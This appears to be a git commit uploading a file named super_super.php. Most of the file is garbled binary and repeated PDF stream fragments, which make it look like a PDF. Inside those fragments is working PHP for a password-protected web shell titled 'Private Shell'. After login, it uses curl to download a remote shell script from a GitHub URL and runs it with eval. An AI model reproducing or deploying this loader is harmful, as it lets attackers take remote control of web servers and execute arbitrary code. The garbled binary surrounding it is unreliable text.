74b9a639c51095e312e8cc8dca4238b0d0e3968a
tim cyber securtiy <71566130+janda354311@users.noreply.github.com>
2024-04-26 20:10:31 -0400

    Add files via upload

---
+++ super_super.php
@@ -0,0 +1,87 @@
+i�����_0��CU1��Pc�i�� 4(��w}���6GK��#K������� ��}D�GT ��`�y�0MA�u�1�>��L�J����0�h�a\9��k��d�B�(S"Q��&��SA�t�N����� �A���;eW�v�i�o����[�$�ȃ#O_�1�VOꕒ>�Y�R��&���H�Ǹ�j*D�KƠ���;{�k$�d�ݍ�w�4ߛ�~!�����|��Ca�֦��݂>�z��4*^.�f2�l�W�ʳOj�:�$�I�9�Y���")�N����n�]�ͫs��o�8'�Z&��a�c��s�_M�4t��vrN�O%��)c:��4,�� �èp#wg���m�h7���]q�Q� �}���+'�0����[�Сt�c+4K�r�:脿�ap�G��LS���ˆ��g��Es�Q��).�;oO��>�bA "z�`���E��9�ajؙ{�ٴ`o�/nd�v�g:VZh��� � endstream endobj 3 0 obj 130 endobj 5 0 obj <> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ���<> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ����vbj�i�����_0��CU1��Pc�i�� 4(��w}���6GK��#K������� ��}D�GT ��`�y�0MA�u�1�>��L�J����0�h�a\9��k��d�B�(S"Q��&��SA�t�N����� �A���;eW�v�i�o����[�$�ȃ#O_�1�VOꕒ>�Y�R��&���H�Ǹ�j*D�KƠ���;{�k$�d�ݍ�w�4ߛ�~!�����|��Ca�֦��݂>�z��4*^.�f2�l�W�ʳOj�:�$�I�9�Y���")�N����n�]�ͫs��o�8'�Z&��a�c��s�_M�4t��vrN�O%��)c:��4,�� �èp#wg���m�h7���]q�Q� �}���+'�0����[�Сt�c+4K�r�:脿�ap�G��LS���ˆ��g��Es�Q��).�;oO��>�bA "z�`���E��9�ajؙ{�ٴ`o�/nd�v�g:VZh��� � endstream endobj 3 0 obj 130 endobj 5 0 obj <> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ���<> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ����vbj������_0��CU1��Pc�i�� 4(��w}���6GK��#K������� ��}D�GT ��`�y�0MA�u�1�>��L�J����0�h�a\9��k��d�B�(S"Q��&��SA�t�N����� �A���;eW�v�i�o����[�$�ȃ#O_�1�VOꕒ>�Y�R��&���H�Ǹ�j*D�KƠ���;{�k$�d�ݍ�w�4ߛ�~!�����|��Ca�֦��݂>�z��4*^.�f2�l�W�ʳOj�:�$�I�9�Y���")�N����n�]�ͫs��o�8'�Z&��a�c��s�_M�4t��vrN�O%��)c:��4,�� �èp#wg���m�h7���]q�Q� �}���+'�0����[�Сt�c+4K�r�:脿�ap�G��LS���ˆ��g��Es�Q��).�;oO��>�bA "z�`���E��9�ajؙ{�ٴ`o�/nd�v�g:VZh��� � endstream endobj 3 0 obj 130 endobj 5 0 obj <> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ���<> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ����vbj�> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ����vbj���e<��,KNeP����
+x»
+Ã0Ew}æÓ+'0¦¡[ÀÐ¡tëc+4K¿rî½:è¿ôapGèLSãúàËßÿg»õEs¥Q»Ì).Ô;oOÂ¹>¯bA
+i�����_0��CU1��Pc�i�� 4(��w}���6GK��#K������� ��}D�GT ��`�y�0MA�u�1�>��L�J����0�h�a\9��k��d�B�(S"Q��&��SA�t�N����� �A���;eW�v�i�o����[�$�ȃ#O_�1�VOꕒ>�Y�R��&���H�Ǹ�j*D�KƠ���;{�k$�d�ݍ�w�4ߛ�~!�����|��Ca�֦��݂>�z��4*^.�f2�l�W�ʳOj�:�$�I�9�Y���")�N����n�]�ͫs��o�8'�Z&��a�c��s�_M�4t��vrN�O%��)c:��4,�� �èp#wg���m�h7���]q�Q� �}���+'�0����[�Сt�c+4K�r�:脿�ap�G��LS���ˆ��g��Es�Q��).�;oO��>�bA "z�`���E��9�ajؙ{�ٴ`o�/nd�v�g:VZh��� � endstream endobj 3 0 obj 130 endobj 5 0 obj <> stream !Mʸ��D���ZYQ�%��F�$Q�e�u�>��L2OI :ҖF��m�׿���P}��)Ɗx�i]>�E��� H�Ry�Z��?^�o�<��������o��� @MD����F��S�0�/�:Ĥ*1�n۱��cB̤,nڮ4��lI�l*g�iid ���U(��@������+�O�cjO%e�\������}��l9�� �ddM:u������,{�T��Y���w���~1@4e~�&��\k�^6��?���ll�exd-����(?\661�]b�˶��7#|��X��gnߧ�po���n偏U����^ϦƜ(a-�a�_�8+��V&�Dr�}����ǚ�d�% <�YK��<�Ǿ�|c��*��}����;Ξ9T�(�h�x�@��qJη�a���%Ҭ����|���Y&`��Qg�p)��1U��7ˢ L��WKKo�� �h�]|w>Q�6g'�Z�|�P��E]_DjO��(�SISQSK^a��В���G'�8>j�������;>�Z�g��ϛ��7��-����� �1��̨:���L��<�W�y%m56q?�m��ߏ����vbj���e<��,KNeP����
+%PDF-1.4
+%Ã¤Ã¼Ã¶Ã
+2 0 obj
+<</Length 3 0 R/Filter/FlateDecode>>
+stream
+x»
+Ã0Ew}æÓ+'0¦¡[ÀÐ¡tëc+4K¿rî½:è¿ôapGèLSãúàËßÿg»õEs¥Q»Ì).Ô;oOÂ¹>¯bA
+"z¹`°ØÊE²à9·ajØ{Ù´`o¡/ndv«g:VZhá¯å 
+endstream
+endobj
+
+3 0 obj
+130
+endobj
+
+5 0 obj
+<</Length 6 0 R/Filter/FlateDecode/Length1 24420>>
+stream
+<?php 
+set_time_limit(0);
+error_reporting(0);
+$auth_pass ="d379754851376f321057a462127c4332";
+if(get_magic_quotes_gpc()) {   
+function VEstripslashes($array) {     
+return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
+$_POST = VEstripslashes($_POST); 
+$_COOKIE = VEstripslashes($_COOKIE); } 
+function Login() {
+  die("<!DOCTYPE html>
+  <html>
+      <head>
+          <title>KONTOL - 𝓟𝓻𝓲𝓿𝓪𝓽𝓮 𝓢𝓱𝓮𝓵𝓵</title>
+          <meta name='description' content='𝕷𝖎𝖋𝖊 𝖎𝖘𝖓𝖙 𝖆𝖘 𝖘𝖊𝖗𝖎𝖔𝖚𝖘 𝖆𝖘 𝖙𝖍𝖊 𝖒𝖎𝖓𝖉 𝖒𝖆𝖐𝖊𝖘 𝖎𝖙 𝖙𝖔 𝖇𝖊'>
+          <link rel='preconnect' href='https://fonts.googleapis.com'>
+          <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
+          <link href='https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap' rel='stylesheet'>
+          <link rel='icon' href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABzElEQVRYhb2XL0gEURDGfx6HiIhcEBGTwSQGETGICIKIGI5D0WC8YhODSUSDGMzmS6bLYrIIIgaTGEQMYhCDQfAvetx9hl11PffO3Xl3NzDs4/Hm+z5mdnfmgYPJ84QLhlMwMAiMuQAkHQXMAing0BEnvvnpvxDcupbBKqBfIN9HrTguymcC6zkHHJsJzgIZuGloGQS9AfIvH7ZgWVXPhOw1rgyC05AMXKlB5D2CYogACQbi4llKkKkSNxsXLClIA+NlgsqfwfVkFbysoMNflwL7pQrPEwQJwZqgUCGt9fCiYFvQ/C1RMCK4bgD5nWAiNH+ClCBfR/J9QWeVEn43mazgpYbE74JlxXnpBX2C8xqQX8mbG+KboFWQcyDPC9pN5GVClgzk64qAHbUmjwbdz02GoFAT7BkycFQr8jbBm0FAUdD1H36UEkwDLQbtCby+4SygUp//ADaAReC1wpnYzemX+Z/hU0h6LwVDgXN9+j2ifXlBP83JJCATApoTtIWcbRHs6O+skHURsBsAehDMR4hJC+4DcftW8mafVIJjQU+M2G7BgR/7ZvobCqb8Gm7KcIWTN2esyGtECxYBq3K8ePo4Q4ItS6DrxTUS1icFciMkyHL2GAAAAABJRU5ErkJggg==' sizes='32x32' />
+      </head>
+  <style>
+      html{
+          background-color: black;
+      }
+      .mind,font{
+          text-align: center;
+          color: #00ceff;
+      }
+      input{
+          background-color: transparent;
+          border-color: black;
+          border: 2px solid #00ceff;
+          border-radius: 50px 20px;
+          text-align: center;
+          color: #00ceff;
+      }
+  </style>
+  <body><br><br>
+      <h1 class='mind'>Memek.iD</h1>
+      <center><br>
+          <form method='post'><input style='text-align:center;' type='password' name='pass'></form>
+          <br><br><br><font>&copy; 2090 Memek.iD</font>
+      </center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if(!empty($auth_pass)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+$link = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $link);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$output = curl_exec($ch); 
+curl_close($ch);      
+eval ('?>'.$output);
+?>
